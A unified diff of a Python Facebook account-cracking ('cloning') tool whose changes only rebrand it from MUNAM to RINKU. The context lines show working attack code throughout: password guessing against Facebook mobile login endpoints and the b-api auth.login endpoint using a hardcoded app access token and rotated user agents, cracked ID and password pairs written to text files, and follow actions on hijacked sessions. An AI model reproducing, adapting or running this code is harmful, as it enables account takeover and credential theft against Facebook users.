@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MUNAM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ RINKU ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -315,14 +315,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ MUNAM-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ RINKU-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ MUNAM-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ RINKU-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MUNAM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ RINKU ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ MUNAM-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ RINKU-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ MUNAM-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ RINKU-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MUNAM-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/RINKU-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -423,16 +423,16 @@ class Main:
 		print(" [4] 2009-2010 Cloning")
 		print(" [5] 2011-2015 Cloning")
 		print(" [!] CTRL + Z \n")
-		MUNAM =input(" Choose : ")
-		if MUNAM in ["1", "01"]:
+		RINKU =input(" Choose : ")
+		if RINKU in ["1", "01"]:
 			File()
-		if MUNAM in ["2", "02"]:
+		if RINKU in ["2", "02"]:
 			Public()
-		if MUNAM in ["3", "03"]:
+		if RINKU in ["3", "03"]:
 			os.system("python Dump.py")
-		if MUNAM in ["4", "04"]:
+		if RINKU in ["4", "04"]:
 			self.old()
-		if MUNAM in ["5", "05"]:
+		if RINKU in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -461,8 +461,8 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK IDZ SAVED IN -> Munam-ok.txt"%(G))
-				print("%s [+] CP IDZ SAVED IN -> Munam-cp.txt"%(Y))
+				print("\n%s [+] OK IDZ SAVED IN -> RINKU-ok.txt"%(G))
+				print("%s [+] CP IDZ SAVED IN -> RINKU-cp.txt"%(Y))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -835,7 +835,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ MUNAM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ RINKU ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -852,15 +852,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MUNAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RINKU-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MUNAM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-RINKU-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MUNAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RINKU-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MUNAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RINKU-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -888,8 +888,8 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> Munam-ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> Munam-cp.txt"%(Y))
+				print("\n%s [+] OK RESULTS SAVED IN -> RINKU-ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> RINKU-cp.txt"%(Y))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -1262,7 +1262,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ MUNAM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ RINKU ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1279,15 +1279,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MUNAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RINKU-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MUNAM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-RINKU-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MUNAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RINKU-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MUNAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RINKU-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1312,8 +1312,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m MUNAM Toll Paid You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : PREMIUM TOOL IS FREE \033[1;37m")
+		print(" \033[1;32m RINKU Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : PREMIUM  \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
